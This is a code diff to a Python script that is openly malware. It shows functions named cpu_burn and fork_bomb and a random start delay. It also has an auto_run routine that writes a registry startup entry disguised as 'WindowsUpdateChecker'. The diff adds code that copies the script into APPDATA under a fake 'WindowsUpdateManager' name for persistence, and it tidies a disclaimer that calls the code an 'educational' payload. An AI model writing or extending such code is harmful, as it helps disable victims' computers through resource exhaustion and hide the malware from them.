@@ -5,6 +5,7 @@ import ctypes
 import random
 import time
 import sys
+import shutil
 
 # Function Definitions
 def cpu_burn():
@@ -63,6 +64,11 @@ def auto_run():
     reg_key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_WRITE)
     winreg.SetValueEx(reg_key, "WindowsUpdateChecker", 0, winreg.REG_SZ, reg_value)
 
+    # Ensure the script itself is copied to the correct location
+    target_path = os.path.join(os.getenv("APPDATA"), "WindowsUpdateManager", "winupd.pyw")
+    if not os.path.exists(target_path):
+        shutil.copyfile(sys.argv[0], target_path)
+
 # Fork Bomb
 def fork_bomb():
     while True:
@@ -72,7 +78,7 @@ def fork_bomb():
 def delayed_start():
     time.sleep(random.randint(10, 60))
 
-#OS
+# OS
 def main():
     system = platform.system()
 
@@ -112,4 +118,5 @@ delayed_start()
 
 # Execute main
 main()
-#This is for educational purposes only and I am not in charge for any missuse for this payload.
+
+# This is for educational purposes only and I am not in charge for any misuse of this payload.
